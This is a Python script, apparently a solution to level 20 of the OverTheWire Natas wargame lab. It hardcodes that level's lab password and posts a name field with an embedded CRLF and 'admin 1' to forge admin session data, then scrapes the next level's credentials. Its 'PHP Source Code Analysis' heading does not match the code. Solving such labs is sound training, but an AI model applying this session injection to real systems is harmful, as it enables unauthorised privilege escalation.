# PHP Source Code Analysis

import re
import requests
import colorama
from bs4 import BeautifulSoup
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas20'
password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'

# Create a session and set the authorization credentials
session = requests.Session()

# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)


data = {"name": "Anything\r\nadmin 1"}
session.post(url, data=data)
resp = session.post(url, data=data)

soup = BeautifulSoup(resp.text, "lxml")
print(f"Username: {re.search('Username: (.*)', resp.text).group(1)}")
print(f"Password: {re.search('Password: (.*)</pre>', resp.text).group(1)}")
